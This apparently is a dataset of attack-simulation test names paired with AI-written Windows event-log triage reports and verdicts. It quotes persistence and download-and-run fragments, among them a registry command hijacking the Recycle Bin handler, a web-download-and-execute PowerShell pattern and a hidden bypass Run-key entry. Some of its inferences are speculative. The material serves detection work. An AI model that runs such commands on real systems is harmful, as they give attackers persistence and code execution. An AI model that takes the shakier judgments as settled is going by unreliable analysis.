3. **Timestamp Manipulation**:
   - There are records in the logs indicating that system time has been adjusted (Event IDs 4616 in Security log and Event ID 1 in the System log), which can indicate tampering to mislead incident response analysis or synchronize with other malicious activities.

4. **Sysmon logs show Process Creation**:
   - There is a significant presence of `wevtutil.exe` executions with the command to clear logs. `wevtutil` is a legitimate Windows utility used for managing event logs, but its execution with `cl` (clear log) commands potentially ties to the aforementioned log clearing activities and should be considered suspicious.

5. **Multiple EdgeUpdate Executions**:
   - Numerous entries of `MicrosoftEdgeUpdate.exe` and associated activities. While this may typically indicate software update procedures, in conjunction with the above-mentioned suspicious activities, these should be validated for legitimacy.

Given these activities, particularly the registry changes, log clearing, and timestamp manipulation, the evidence indicates a strong likelihood of malicious behavior.

### Assessment
- **Resolution**: MALICIOUS
  - **Threats Identified**: Indicators point towards possible manipulation for unauthorized access or persistent threats. Especially concerning is the registry modification which might indicate potential credential theft activities.
  - **Risks**: Compromise and persistence on the machine by malicious actors.

### Guidance on How to Proceed
- **Immediate Actions**:
  - Isolate the affected system from the network to prevent potential lateral movement.
  - Conduct a full forensic investigation to identify and remove any unauthorized software or configurations.
  - Review and strengthen network and endpoint defenses, ensuring comprehensive monitoring of PowerShell activities and registry changes.
  - Reset credentials for users who accessed the compromised system.
- **Long-term Actions**:
  - Implement stricter access controls, including multi-factor authentication, particularly for administrative accounts.
  - Regularly review and alert on changes to critical registry keys and servicing of event logs.
  - Conduct user training on recognizing phishing attacks or other potential vectors leading to execution of unauthorized scripts."
Remote Process Injection with Go using NtQueueApcThreadEx WinAPI,"**Analysis of the Logs**

1. **Logon Events (EventID: 4624 and 4672):**
   - There are several occurrences of EventID 4624 which logs successful logons for the SYSTEM account under the NT AUTHORITY domain, with a logon type of 5 (Service Logon). These entries are routine system activity as services log on as the SYSTEM account.
   - Privileges associated with SYSTEM (EventID 4672) are standard for this account and do not indicate any unusual behavior on their own.

2. **Credential Validation (EventID: 5379):**
   - Events with ID 5379 indicate credential validation errors related to Microsoft Account logins, with ReturnCode 3221226021 (access denied). This could be due to incorrect credentials or permissions and doesn't necessarily imply malicious activity without further context.

3. **User Enumeration (EventID: 4798):**
   - Multiple EventID 4798 entries show enumeration of users by SYSTEM via `taskhostw.exe`. While taskhostw is a legitimate Windows process, repeated enumeration of users might be worth further investigation, particularly if unexpected in normal operations.

4. **Suspicious PowerShell Activity (Sysmon and Windows PowerShell logs):**
   - Sysmon EventID 1 and Windows PowerShell logs indicate a PowerShell command executed from a temporary directory, invoking `NtQueueApcThreadEx.exe` with `-debug` parameter.
   - This specific behavior deviates from normal activities, as the execution of a binary from a temporary directory using PowerShell raises a red flag and often aligns with post-exploitation or malicious behavior like executing custom scripts or deploying payloads.

5. **Other Sysmon Events:**
   - Common Windows processes are invoked (e.g., `whoami.exe`, `HOSTNAME.EXE`, `sc.exe`) indicating routine operations, updates, or configurations being altered. However nothing in these events explicitly indicates suspicious or malicious activity based on typical system behavior.

6. **Edge Update Process (Sysmon Events):**
   - Regular updates and installations for Microsoft Edge are documented and show activity consistent with an automated update mechanism.

**Assessment:**
- The PowerShell activity seen in the logs is particularly concerning due to its context and origin from a temporary directory with a parameter that suggests debugging or reverse-engineering is being performed. This is commonly related to malicious activities.
- Credential validation errors and user enumeration are potentially benign but should be corroborated with other context to rule out hostile exploration or attempts.

**Conclusion:**
- **Resolution: MALICIOUS.**

**Guidance:**
- Immediate steps should include isolating the affected system for further forensic analysis.
- Review the mentioned PowerShell scripts and binaries to determine intent and potential compromises.
- Check for any additional abnormal network activity surrounding the timeframe of these events.
- Review user activities and privileges in the system for unauthorized modifications or access levels.
- Update and strengthen endpoint protection to prevent execution of scripts from temporary directories and similar vectors."
Winlogon Userinit Key Persistence - PowerShell,"Upon examining the provided Windows event logs, we can identify the following suspicious behavior:

### Key Observations:

1. **Suspicious PowerShell Usage:**
   - There are multiple PowerShell events where a PowerShell command is used to modify the Windows registry key associated with user logon. Specifically, the registry key `HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit` is being altered to append `C:\Windows\System32\cmd.exe` to the `Userinit.exe`, which is indicative of an attempt to execute additional scripts or commands during user logon.
   - This behavior is often observed in malware or attacker tactics to ensure persistence on a compromised system by executing additional commands during user logon.

2. **Sysmon Process Activities:**
   - There are multiple Sysmon logs showing the execution of `whoami.exe`, `conhost.exe`, and `powershell.exe` by the user `SERVER002\admin_test` with high integrity levels. Although `whoami.exe` and `conhost.exe` are legitimate Windows commands, their simultaneous execution pattern, especially after the suspicious PowerShell activity, can be indicative of post-exploitation activities intended to gather information about the compromised host and maintain stealth.
   - The use of `whoami.exe` and `powershell.exe` within a close timestamp indicates an operator or script might be gathering information about the user context or making system changes.

### Assessment:

- The behavior observed in the PowerShell logs of registry modification to include `cmd.exe` in the user initialization process is particularly concerning. Such modifications are commonly used by malware to maintain persistence on a host, by ensuring that a command prompt (cmd.exe) is launched each time a user logs in, which could be further used to execute commands covertly.
- The execution of multiple system utilities in quick succession with high integrity and from the same user context shortly after indicates a potentially malicious user activity trying to assess or manage the current environment.
- The repetitive update attempts by Microsoft Edge Update are observed but can generally be considered benign under normal circumstances, showing regular update operations by a legitimate application.

### Conclusion:

Given the presence of these events, the logs present indicators that suggest potentially malicious activity. Specifically, the registry modification via PowerShell to introduce unauthorized logon command execution is a known persistence technique used by attackers.

**Resolution: MALICIOUS**

### Guidance and Next Steps:

1. **Immediate Containment:**
   - Isolate the affected machine (`Server002`) from the network to prevent any potential lateral movement by the attacker.

2. **Further Investigation:**
   - Perform full endpoint forensic investigation to identify further signs of compromise or malware.
   - Review other logs and alerts for any additional signs of this pattern, focusing on similar PowerShell activities.

3. **Eliminate Persistence:**
   - Revert the registry changes using a secured administrative account. Ensure that `Userinit` is reset to its original value without `cmd.exe`.

4. **Assess Impact:**
   - Investigate if any sensitive information may have been accessed or exfiltrated and take appropriate legal or organizational actions.

5. **Preventive Measures:**
   - Enhance monitoring for suspicious PowerShell command usage and registry changes.
   - Implement least privilege access and monitor user activity closely to prevent unauthorized actions."
Service Installation PowerShell,"### Detailed Analysis:

**1. PowerShell Execution:**
   - Multiple entries in the PowerShell logs show the creation and starting of a new service called `fileTestService_PowerShell`. This was conducted via the PowerShell script `New-Service` and `Start-Service` commands.
   - The binary for the service, `fileService.exe`, is located in a temporary directory: `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.003\bin\fileService.exe`.
   - Usage of temporary directories for executing binaries is often associated with suspicious activities as malicious actors typically use such locations to execute their payloads without drawing attention.

**2. Service Control Manager Log:**
   - The System Log confirms the installation of the service `fileTestService_PowerShell` with the path `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.003\bin\fileService.exe` running under `LocalSystem` account, which provides high privileges.
   - The creation of services in this manner is a common persistence mechanism employed by malware to ensure execution at startup, especially when connected to high privilege accounts.

**3. Sysmon Logs:**
   - The Sysmon logs indicate that `powershell.exe` and `fileService.exe` (running under `NT AUTHORITY\SYSTEM`) executed, matching the suspicious behavior found in the PowerShell and System logs.
   - Processes such as `wevtutil.exe` and `conhost.exe` executed multiple times but did not provide additional insight into malicious behavior.

**4. Application Log:**
   - An entry shows that the `fileService` started successfully, corroborating with the service creation event in the PowerShell and System logs.
   - Entries concerning `edgeupdate` indicate routine updates/checks for Microsoft Edge, with no associated suspicious or malicious activity beyond expected behavior.

### Assessment and Resolution:
The logs present a clear sign of potentially malicious activity:
- The creation of a persistent service named `fileTestService_PowerShell` using PowerShell, storing its binary in a temporary directory, and running it with high privileges signifies a typical attack vector seen in malware where an attacker wants to ensure persistence.
- No other standard business processes are typically executed from temporary directories with system-level privileges, reinforcing that this is not expected benign behavior.

Given the evidence, I conclude the activity is **MALICIOUS**. The following actions should be taken immediately:

### Guidance:
1. **Immediate Quarantine:**
   - Disconnect the affected machine from the network to prevent further spread or data exfiltration.

2. **Forensic Analysis:**
   - Perform a thorough forensic analysis of `fileService.exe` to determine its functionality and origin.
   - Investigate how this PowerShell script was executed on the system (e.g., was it through user interaction, email, or drive-by-download?).

3. **System Restoration:**
   - Consider restoring the system from a clean backup after ensuring that no malicious remnants remain.

4. **Review Security Measures:**
   - Strengthen endpoint detection and response systems to identify, log, and alert on similar suspicious activities.
   - Ensure PowerShell logging is enabled and actively monitored for anomalous activities.

5. **User Awareness Training:**
   - Reiterate the importance of cybersecurity hygiene and awareness among users to prevent accidental execution of malicious scripts."
Remote Process Injection with Go using CreateRemoteThread WinAPI,"Upon reviewing the provided Windows event logs for any signs of malicious activity, certain entries stand out and warrant further analysis:

### Observations:

1. **PowerShell Events**:
    - Logs indicate the execution of PowerShell with the command to start the process `werfault.exe` and subsequently execute `CreateRemoteThread.exe` with the `-debug` flag. This behavior is not typical for standard administrative tasks and is often associated with sophisticated attacks that involve process injection or exploitation using tools like Metasploit. The use of `CreateRemoteThread` suggests an attempt to manipulate or interact with another process's memory space, which is commonly seen in malicious activities.

2. **Time Skew Events**:
    - Multiple instances of time changing back and forth are recorded (e.g., EventID 4616). This behavior might suggest temporal manipulation for evasion purposes, though it could also arise from misconfigurations or legitimate system corrections. Tracking time adjustment events is crucial as attackers often use such techniques to confuse or evade detection systems.
    
3. **Security Log - Privilege Usage**:
    - The `admin_test` account is observed using an elevated privilege set (SeDebugPrivilege, SeLoadDriverPrivilege, etc.) which could potentially facilitate unauthorized actions if misused.

4. **Sysmon Logs**:
    - Frequent execution of `wevtutil.exe` under the `admin_test` account. This tool is typically used for querying event logs, which could indicate log tampering or information gathering by an attacker.

5. **Normal Update Processes**:
    - There are entries related to `MicrosoftEdgeUpdate.exe` and routine system processes like `svchost.exe` and `MpSigStub.exe` that appear benign, as they are typical for system updates and operations.

### Assessment:

Given the evidence, the execution of PowerShell scripts that attempt to manipulate system processes and potential time-stomping indicators raise suspicion. These activities are often aligned with malicious intents to manipulate the system, hide tracks, or leverage elevated rights illicitly.

### Resolution:

- **Resolution**: **MALICIOUS**

### Guidance on Proceeding:

1. **Immediate Containment**:
   - Quarantine the affected host to prevent further potential compromise and lateral movement within the network.

2. **Forensic Analysis**:
   - Conduct a deeper forensic analysis of the system to understand the full extent of the breach and identify any additional compromised assets or associated artifacts.

3. **Credential Security**:
   - Review the usage of any accounts like `admin_test` and reset credentials. Monitor for any further abnormal login behavior or privilege usage.

4. **Event Log Review**:
   - Examine the event logs in finer detail, focusing on the periods surrounding suspicious entries, looking for any signs of persistence mechanisms or additional suspicious activity.

5. **Security Awareness**:
   - Alert the IT team and relevant personnel about the findings and ensure that preventive measures are in place to mitigate future risk, such as reinforcing security protocols around PowerShell usage and auditing high-privilege accounts closely.

6. **Patch and Update**:
   - Ensure the system is fully updated with the latest security patches to minimize vulnerabilities.

These steps are essential in responding to and mitigating any potential risks from the identified malicious activity in the Windows event logs."
Parent PID Spoofing - Spawn from svchost.exe,"Upon reviewing the provided logs, I have identified several key observations:

### Windows PowerShell Log:
- Multiple entries involve PowerShell execution with complex commands, such as leveraging `Get-CimInstance` and `Start-ATHProcessUnderSpecificParent`. These are indicative of advanced scripting which could be used for enumeration or execution under specific contexts, which often relates to malicious activity, particularly if found on servers or secured environments where such activities aren't standard practice.
- An entry with `PowerShell -ExecutionPolicy Restricted` referencing inspection of `.inf` files for specific patterns. This is not typical for benign administrative tasks and can be indicative of scanning for certain files or configurations, often a preliminary step in an attack.

### System Log:
- Numerous Windows Update activities are recorded, which is fairly routine and benign, with no signs of immediate threat.

### Security Log:
- Several failed credential accessing events (Event ID 5379) occurring in quick succession. While these could be normal system attempts to access network credentials or services, their failure and the rapid number of attempts without subsequent successful events are suspicious.
- Privilege escalation is noted (Event ID 4672) with a wide range of privileges including `SeDebugPrivilege`. While SYSTEM processes have such privileges, combined with the other activity, this could be indicative of preparing for malicious actions.

### Sysmon Log:
- Multiple execution instances of PowerShell under a non-standard context are noted. The PowerShell activity is coupled with administrative execution (`admin_test` user running high-integrity processes), raising concerns especially given the advanced process creation.
- Execution of binaries like `CompatTelRunner.exe`, typically related to compatibility telemetry, could be routine, but given the chain with PowerShell activities, warrants attention to ensure these are not being subverted.

### Final Assessment:
- The presence of advanced PowerShell commands, failed credential access attempts, and execution of non-standard scripts and binaries under high-integrity suggests initially suspicious activity. However, while these could be part of legitimate tasks, the combination and context lean more towards potentially nefarious operations pending further clarification.

### Conclusion: 

**Resolution: SUSPICIOUS**

Given the context, I recommend additional investigation to confirm the legitimacy of the suspect PowerShell activities and review corresponding user activities during these times. Implement monitoring for further anomalous behavior and, if necessary, perform an in-depth forensic analysis of the affected host for potential compromises."
WinPwn - Get SYSTEM shell - Pop System Shell using Token Manipulation technique,"After analyzing the provided logs from the Windows host, several key observations can be made, which are indicative of potentially malicious activities:

1. **Security Logs:**
   - **Event ID 4672:** This indicates a privileged logon with a multitude of special privileges. The account `admin_test` is granted significant privileges such as `SeDebugPrivilege`, `SeSecurityPrivilege`, and others, which could be indicative of privilege escalation or usage of a high-privileged account for critical actions.
   - **Event ID 4634 and 4624:** These indicate the logoff and logon of the user `admin_test` using NTLM authentication from a remote workstation `DESKTOP-3HL5B2P` via Logon Type 3 (network logon), which in itself isn't suspicious but should be considered in the larger context.

2. **Sysmon Logs:**
   - The frequent execution of system utilities like `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, and `whoami.exe` by the `admin_test` account is noteworthy. This kind of activity often accompanies system reconnaissance or administrative tasks.
   - **Sysmon Process Creation Event (Event ID 1):** A PowerShell script is executed, which downloads and executes a script from GitHub: `TokenManipulation/Get-WinlogonTokenSystem.ps1`. This script is a known offensive security tool used for token manipulation and privilege escalation.
   - This indicates potentially unauthorized usage of PowerShell to execute downloaded scripts, which is a red flag for malicious activity.

3. **Windows PowerShell Logs:**
   - The logs confirm the execution of a PowerShell with high privilege that calls an external script from the web, highlighting a classic indicator of malicious or unauthorized behavior.
   - The PowerShell log further substantiates the execution of the suspicious PowerShell script with `iex(new-object net.webclient).downloadstring` pattern which is often associated with the downloading and execution of scripts from the internet.

4. **Application Logs:**
   - Windows Defender was noted to be active at the time of these incidents, although no specific threat detections were reported in these logs.

5. **System Logs:**
   - The change in system time shortly before the suspicious PowerShell activity might raise questions about time manipulation possibly to evade detection mechanisms based on time.

**Assessment:**
- The activity observed in the logs, notably the execution of a potentially unauthorized PowerShell script, potentially indicates a deliberate attempt at privilege escalation and system manipulation, using tools commonly associated with cyber-attacks.

**Resolution: MALICIOUS**
- Given the usage of known offensive security tools via PowerShell, the granting of extensive privileges to a user account, and the execution of scripts from non-trusted external sources, the actions captured in the logs should be considered malicious.

**Guidance on Proceeding:**
- Immediately isolate the affected system from the network to prevent further potential malicious actions.
- Conduct a deep forensic analysis focusing on the executed scripts, any changes made to the system, and further traces of the intrusion.
- Update the security configuration to include monitoring for the execution of PowerShell scripts and suspicious utilities for early detection.
- Consider resetting credentials for users involved and reinforcing multi-factor authentication across critical accounts.
- Notify Incident Response and security teams to manage and mitigate any potential further impact.

It is crucial to ensure logging, monitoring, and alerting systems are adequately configured to detect and respond to similar threats proactively in the future."
Domain Password Policy Check: Common Password Use,"**Detailed Analysis of the Windows Event Logs:**

### Anomalous or Suspicious Behavior:
1. **PowerShell Usage**:  
   - Logs indicate consistent usage of PowerShell (e.g., `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`). Notably, there was a complex command involving password management, seen in the logs and CommandLine from the `Windows PowerShell` events. This command attempts to manage account passwords possibly indicating automated password management via a script. The script checks, updates, and stores account passwords securely, additionally handling potential errors, which seems to be a structured and well-maintained process.
     
2. **Wevtutil.exe Execution**:  
   - The frequent execution of `wevtutil.exe`, a utility used for event log management, suggests potential tampering or comprehensive log management activity. While this can be normal administrative behavior, in the context of lacking supporting justification or unusual patterns, it can be construed as suspicious.

3. **Command Line Arguments**:  
   - The confirmed presence of PowerShell manipulating credentials and password management is indicative of privileged operations but does not raise immediate red flags of malicious activity when contextualized (i.e., no unexplained privilege escalations, sourced from valid admin accounts).

4. **Frequent Execution of conhost.exe**:  
   - The presence of numerous `conhost.exe` processes aligns with normal background operations that manage the console window sessions. However, concurrency and frequency without excess context may sometimes indicate attempts to mask malicious scripts.
  
5. **Edge Update Activity**:  
   - Multiple occurrences of Edge Installer processes being invoked. Given the settings and validation aspects logged (`--system-level --verbose-logging`, etc.), these can be legitimate updates or installations, commonly executed with elevated privileges (seen under `NT AUTHORITY\SYSTEM`).

6. **Security Event (ID 4799)**:  
   - Dominated by Edge processes, indicating group membership or security descriptor modification. This event in isolation does not immediately suggest a threat but should be examined if logs correlate with unauthorized access patterns elsewhere.

### Assessment of Potential Malicious Activity:
- **PowerShell Activities** merit close scrutiny. These scripts do not demonstrate malicious code independently but signify actions pivotal for maintaining system credentials, possibly an internal script for password policy management.
  
- **No Evidence of Known Malicious Indicators**:  
  The logs don’t exhibit usual hallmarks of advanced persistent threats, such as privilege escalation events, abnormal network connections, or obfuscated command-line arguments beyond typical administrative actions.

### Types of Threats or Risks:
- **Credential Management Script**: Could pose a risk if misused or improperly secured, leading to potential unauthorized management of user credentials.
   
### Resolution and Guidance:  
Based on the logs, events do not exhibit overt actions of compromise or recognizable threats. The events align more with potential administrative activity or routine software updates and account management.

**Final Resolution: SUSPICIOUS**

- **Guidance**: Continuing vigilance is suggested, especially analyzing whether credential management actions are standard practice, and verifying expected execution of `wevtutil.exe`. Ensure all legitimate scripts are accounted for, intended, and documented in policy to avoid internal misuse or oversight errors. If any behavior remains unexplained or further oddities are uncovered, a heightened level of review or audit on credential handling procedures should be conducted."
WMI Invoke-CimMethod Scheduled Task,"### Detailed Analysis of Windows Event Logs

#### System Log Analysis
- **Event Logs 3569 to 3573**: These events show that `svchost.exe` updated system time. This task is typically initiated by time synchronization services and does not, in itself, indicate malicious activity.

#### Sysmon Log Analysis
- **Event Log 17946**: Indicates the execution of `powershell.exe` by the user `SERVER002\admin_test`. While PowerShell is a legitimate administrative tool, it is frequently used in attacks if running suspicious scripts. The context or script executed is not immediately visible from this log entry alone.
- **Event Logs 17950 to 17966 (wevtutil.exe and conhost.exe executions)**: The execution of `wevtutil.exe` (a command-line utility that lets users manage Windows Event Logs) by the user `admin_test` can suggest benign activity such as log cleansing or malicious activity like log clearing by attackers. Frequent initiations in a tight timeframe could raise suspicion.
- **Event Log 17968 - 17977**: Repeated runs of `hostname.exe`, `whoami.exe`, and `conhost.exe` are logged. These commands are standard tools and utilities to check system identity and user information. Their usage is not inherently malicious without additional context. However, `whoami.exe` could be used in post-exploitation to gather user account details.

#### Windows PowerShell Log Analysis
- **Event Logs 1067 to 1074**: These log entries show PowerShell executing scripts or tasks with cmdlets like `Invoke-CimMethod`. The command snippet suggests reading XML content from the file system and registering tasks via WMI. This activity could be potentially suspicious if done without explicit administrative tasks or tasks typically handled by IT operations.

#### Security Log Analysis
- **Event Logs 30358 to 30362**: Highlight noticeable items such as security auditing linked to time changes and administrator activities (user: `admin_test`) with marked privileges such as `SeDebugPrivilege`, which could be risky if in unsanctioned hands.

#### Application Log
- **Event Log 2386**: An entry made by the Software Protection Platform Service, does not appear suspicious.

### Assessment
From the logs:
- Usage of `PowerShell` to execute commands that manipulate COM/WMI objects to register scheduled tasks is suspicious and a common vector in attacks.
- Execution of `wevtutil.exe` in succession without standard context such as system maintenance also raises suspicion for potential log clearance.

### Conclusion and Recommendation
**Resolution: SUSPICIOUS**

1. **Further Investigation**: The combination of PowerShell execution with complex arguments, and the sequence of `wevtutil.exe` executions, suggests this host could be involved in suspicious activities, possibly unauthorized or malicious. 
2. **Analyze Context**: Confirm whether these actions align with legitimate administrative tasks. Review the PowerShell script contents and scheduled tasks registered using WMI.
3. **Monitoring & Response**: Increase monitoring on this host and perform a thorough examination of recent activities and administrative tasks executed by `admin_test`.
4. **Security Audit**: Ensure that all users, especially those with high privileges like `admin_test`, follow established security protocols and practices. 

As there is no clear indication of system compromise within these logs alone but potential misuse or preliminary steps often seen in malware deployment, additional logs and context should be assessed before declaring the activity inside as definitivley malicious."
Azure AD - adding user to Azure AD role,"Upon examination of the provided Windows event logs, here is a detailed analysis of the observed behavior:

1. **Windows PowerShell Log Analysis**:
   - The logs indicate that PowerShell was executed with a script that imports the AzureAD module, creates a credential object, and attempts to connect to Azure Active Directory using specified credentials.
   - The script retrieves a user with the display name or UPN 'SuperUser' and attempts to add this user to the 'Global Reader' role.
   - Importantly, the password used is visible in plaintext as ""p4sswd"", which is a security concern because it indicates improper password handling and can lead to credential exposure.

2. **Sysmon Log Analysis**:
   - The logs show that PowerShell was executed from the directory `C:\Windows\System32\WindowsPowerShell\v1.0\`, which is a legitimate PowerShell path. However, it raises slight concern considering the context of the PowerShell script executed.
   - Various Windows utilities like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe` have been launched, all of which are legitimate system binaries.
   - The legitimate use of Windows utilities for system configurations or investigations suggests typical administrative behavior. Despite this, the combination of scripts with credential disclosure is a pertinent security concern.
   - All activities were executed by the user ""SERVER002\\admin_test"" with high integrity, suggesting administrative privileges were utilized during these operations.

3. **Suspicious Indicators**:
   - The hardcoded plain-text password (`""p4sswd""`) in the PowerShell script is a significant security flaw.
   - The use of high-integrity processes and legitimate account privileges may suggest an attempt to manipulate system settings or user roles without detection.
   - The presence of processes like `wevtutil.exe` could indicate log clearing activities, a common tactic to hide tracks after a malicious operation.

4. **Conclusion**:
   - **Resolution**: **SUSPICIOUS**
   - While the specific processes observed might not be outright malicious on their own, the use of PowerShell to modify user roles in Azure AD with an insecure handling of credentials and the associated process executions elevate the concerns.
   - There is potential misuse of administrative privileges that could suggest a risky operation or possible nefarious activity.

**Guidance**:
- Immediate review of the credentials used in the PowerShell script to change the password from plain text.
- Verify the legitimacy of user ""SERVER002\\admin_test"" actions and intent, ensuring they align with known administrative tasks.
- Conduct an audit of Azure AD to confirm whether unauthorized role changes were made.
- Implement security measures to prevent plain-text password usage in scripts, such as using environment variables or secure vaults for credential storage.
- Monitor for further unusual activities or additional attempts to modify user permissions or system configurations."
SystemBC Malware-as-a-Service Registry,"After thoroughly analyzing the provided Windows event logs, the following observations have been made:

### Suspicious and Anomalous Behaviors:

1. **Windows PowerShell Log Entries:**
   - The PowerShell logs show entries indicating the use of PowerShell to modify registry keys linked to the current user's login startup programs, specifically setting a ""socks5_powershell"" entry to run a hidden PowerShell script with execution policy bypass. This is suspicious as it may indicate an attempt to persist malicious scripts using PowerShell at startup, especially given the use of `-WindowStyle Hidden -ExecutionPolicy Bypass`.

2. **Sysmon Log Entries:**
   - Multiple events of `wevtutil.exe` and `conhost.exe` are noted under the user `SERVER002\admin_test`. While `wevtutil.exe` is a legitimate tool to manage Windows Event logs, frequent invocation can be indicative of malicious attempts to cover tracks by altering event logs.
   - Execution of `hostname.exe` and `whoami.exe` with a high integrity level by a user (`SERVER002\admin_test`) looks like reconnaissance activities to get system and user information.

### Indicators of Malicious Activity:

- **PowerShell Registry Modification for Persistence:**
  - The PowerShell event demonstrates clear indicator of potential malicious persistence techniques by altering startup registry keys with hidden scripts execution, which aligns with tactics seen in advanced persistence threat actors.

### Assessment and Action Plan:

- **Situation Assessment:**
  - Based on the PowerShell activity, the use involves hidden execution and registry modifications, which strongly suggest malicious persistence.
  - The Sysmon logs with `wevtutil.exe` usage by an administrative account without corresponding audit indicates potential log tampering.
  - The reconnaissance activity using `whoami.exe` and `hostname.exe` adds to the suspicion of unauthorized activity or a compromised account.

- **Resolution: MALICIOUS**

- **Threats and Risks:**
  - Possibility of unauthorized access and persistence in the network environment.
  - Potential data exfiltration or further system command and control through the compromised host.

- **Guidance on How to Proceed:**
  - Immediate isolation of the affected host to prevent lateral movement and potential data loss.
  - Conduct a full forensic analysis of the compromised machine to determine the scope and impact of the compromise.
  - Review user account activity, especially the use of `SERVER002\admin_test` for any unauthorized access or privilege escalation activities.
  - Check startup registry for unauthorized modifications and remove any suspicious entries.
  - Update all security systems (IDS/IPS) and implement strict monitoring for similar suspicious activities.
  - Communication with involved stakeholders regarding the incident and execution of the security incident response plan.

Please ensure a detailed incident report is prepared and incident response procedures are complied with to address any potential exposures resulting from this activity."
Powershell Cmdlet Scheduled Task,"Upon analyzing the provided Windows event logs, particularly focusing on the PowerShell and Sysmon logs, I have identified several aspects worth noting:

1. **Unusual PowerShell Usage**:
    - There are multiple instances where PowerShell is used to create a new scheduled task with the command `calc.exe`. It involves using high privileges (i.e., `BUILTIN\Administrators` -RunLevel Highest) and triggers at logon, which could be an indication of persistence or privilege escalation attempt.
    - The PowerShell command line used for this task is often associated with attempts to obfuscate activity or mimic benign behavior, as `calc.exe` is commonly used for testing but could be replaced with other commands in real scenarios.

2. **Sysmon Logs**:
    - The Sysmon logs show repeated executions of Windows utility programs like `wevtutil.exe`, `conhost.exe`, and commands like `hostname.exe` and `whoami.exe`, executed by a user 'SERVER002\\admin_test'. These actions, while sometimes benign in isolated events, can be indicative of reconnaissance activity if observed in conjunction with other suspicious activities.
    - The presence of these system utilities suggests someone might be probing the system environment or configurations.

3. **Software Protection Platform Service Logs**:
    - This log does not directly indicate malicious activity but may correlate with attempts to bypass software licensing restrictions or checks.

**Assessment and Resolution:**
- The PowerShell commands creating scheduled tasks with high privileges, especially with triggers that work at login, are commonly used techniques for persistence by attackers.
- The combination of using `calc.exe` as a placeholder and executing multiple reconnaissance commands could be signs that this is a part of a scripted attack sequence or a test.

**Final Resolution: MALICIOUS**:
- Given the context of using PowerShell to create tasks that run at elevated privileges and execute on user login, along with the sequence of observed system commands, I am confident that this activity is malicious.
- I recommend immediate action to disable the scheduled tasks created by these commands, review user permissions on the affected system, and conduct further system-wide scans for any additional indicators of compromise.
- It would also be prudent to investigate the origin of these commands and evaluate account logins and usage to determine how the attacker gained initial access."
Suspicious bat file run from startup Folder,"### Detailed Analysis

Upon analyzing the provided Windows event logs, certain activities stand out and may indicate suspicious behavior:

1. **Repetitive Use of `wevtutil.exe`**: The logs show multiple instances of `wevtutil.exe` being executed by the user `SERVER002\admin_test`. This utility is often used legitimately for managing event logs, but its repetition might also suggest someone trying to clear event logs to remove traces of activity. This action could be part of a tactic to conceal unauthorized activities.

2. **PowerShell Script Execution**: There are multiple events indicating PowerShell scripts being executed under `SERVER002\admin_test` context:
    - A PowerShell command attempts to copy a batch file (`batstartup.bat`) to startup folders. This is typically indicative of an attempt to gain persistence by ensuring the batch file starts with Windows. This is a classic behavior for many types of malware.
    - Execution of a PowerShell script to start this batch file further indicates the intention to execute something at startup indiscriminately.

3. **Use of High-Integrity Processes**: Several processes are running with high integrity levels, meaning they have elevated privileges which could be exploited further. Various high-integrity processes are being run by the user `admin_test`, such as `whoami.exe`, `hostname.exe`, and `PowerShell.exe`.

4. **Security Time Change Events**: The security log reveals an event where time manipulation (`Event ID 4616`) occurs, which can be a method used to skew event timestamps and cover tracks of malicious activities.

5. **Unusual Commands and Persistence Indicators**:
    - The use of `PowerShell.exe` with commands to alter startup configurations directly points to attempts at persistence. Modification of startup items is uncommon for a standard user operation and serves as an indicator of concern.

### Assessment

Based on the indicators identified:

- The repetitive execution of `wevtutil.exe` by an administrative user typically used to clear logs, combined with the observed PowerShell script moving to and executing from startup locations, signals unauthorized persistence mechanisms.
- Use of PowerShell commands to copy files into startup directories is suspicious and points toward potentially malicious intent.
- Adjustments to the system clock in quick succession could be an attempt to alter event timestamps, which, alongside persistence techniques, further suggests unauthorized system modifications.

### Conclusion

The behavior observed in the logs should be categorized as **MALICIOUS**. These activities strongly suggest that unauthorized and potentially harmful actions are being taken within this host. The logs display behaviors commonly associated with malware presence, such as persistence mechanisms and log tampering.

### Recommendations

- Immediately isolate the host `Server002` from the network to prevent potential spread or data exfiltration.
- Conduct a thorough file system check and scan for malware on this host.
- Review startup items and scheduled tasks for unauthorized or suspicious entries.
- Consider restoring from a known good backup and updating all credentials for the affected user accounts.
- Assess the broader network for similar activities to ensure this is an isolated incident."
Add persistance via Recycle bin,"## Detailed Analysis of the Logs:

### Sysmon Log Analysis:
Several entries of the Sysmon logs show the execution of processes including `wevtutil.exe`, `conhost.exe`, `cmd.exe`, and Windows management instrumentation (`wsmprovhost.exe`). Notably, there is an event (RecordID: 17982) demonstrating the execution of `cmd.exe` with suspicious command-line arguments: `reg ADD ""HKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\\command"" /ve /d ""calc.exe"" /f`. This strongly indicates a registry modification aimed to persistently open the calculator, which can be an indicator of compromise or malicious activity.

### Application Log Analysis:
The Application logs show the stopping of a service named ""edgeupdate."" While the stopping of services is not uncommon, combined with other activities, it can be a concern if unauthorized.

### Overview of Identified Risks:

1. **Registry Tampering**: 
   - The use of `cmd.exe` to modify the registry key that influences behavior linked to the system trash bin icon (GUID: `{645FF040-5081-101B-9F08-00AA002F954E}`) is highly suspicious. Such actions are potentially used in malicious activities such as redirecting what functions are triggered by GUI interactions.
   
2. **Sequential Command Executions**:
    - Sequential execution of `wevtutil.exe`, `whoami.exe`, and `cmd.exe`, suggests enumeration activities and possible tampering with event logs.

### Recommendations and Resolutions:

- **Immediate Risk Mitigation**:
   - Validate the integrity and purpose of batch modifications to registry keys, particularly those affecting system persistence mechanisms.
   - Real-time monitoring should be increased around processes attempting similar modifications and high-integrity activities.

- **Assess Potential File Changes**:
   - Investigate any changes to critical system files or anomalous file activities.
   
- **Investigate User Activity**:
   - Review and verify activities performed by the user `SERVER002\\admin_test`. This includes the origin of remote sessions or internal command executions possibly linked to privilege escalation.
   
- **Evaluate External Threat Sources**:
   - Correlate such activities with potential external threat intelligence signals or similar past incidents.

Given the above analysis, the resolution I provide for the observed log activities is:

**Resolution: MALICIOUS**

The logs indicate potential malicious activity pertaining to unauthorized registry changes disguised to appear benign (e.g. executing `calc.exe` under specific registry modifications), likely aiming for persistence or intended unauthorized actions, warranting immediate security actions and further investigation."
